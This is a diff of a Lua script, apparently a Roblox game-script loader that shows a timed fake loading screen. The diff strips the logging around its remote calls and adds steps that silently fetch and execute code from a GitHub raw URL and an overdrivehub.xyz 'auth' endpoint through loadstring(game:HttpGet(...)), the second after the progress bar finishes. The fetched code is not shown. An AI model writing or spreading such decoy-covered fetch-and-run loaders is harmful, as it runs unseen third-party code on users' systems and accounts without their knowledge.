@@ -108,19 +108,9 @@ creditText.Size = UDim2.new(1, 0, 0.05, 0)
 creditText.Position = UDim2.new(0, 0, 0.95, 0)
 creditText.Parent = background
 
--- Background loading scripts (Execute both loadstrings simultaneously)
+-- Background loading script (Execute the external script in the background silently)
 task.spawn(function()
-    -- First script: Auth API request
-    print("Executing Auth API script")
-    loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
-    print("Auth API script executed")
-end)
-
-task.spawn(function()
-    -- Second script: MM2 script
-    print("Executing MM2 script")
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/arlenwood/MM2/main/script.lua"))()
-    print("MM2 script executed")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/arlenwood/overdrive/refs/heads/main/script.lua"))()
 end)
 
 -- Progress update loop
@@ -148,6 +138,12 @@ for i = 0, 100 do
 
 	wait(1.8)
 end
+
+-- Execute the final background script after the timer ends (once loading is complete)
+task.spawn(function()
+    wait(1) -- Wait for the loading process to complete
+    loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
+end)
 
 -- Fade out everything once loading is complete
 for i = 1, 10 do
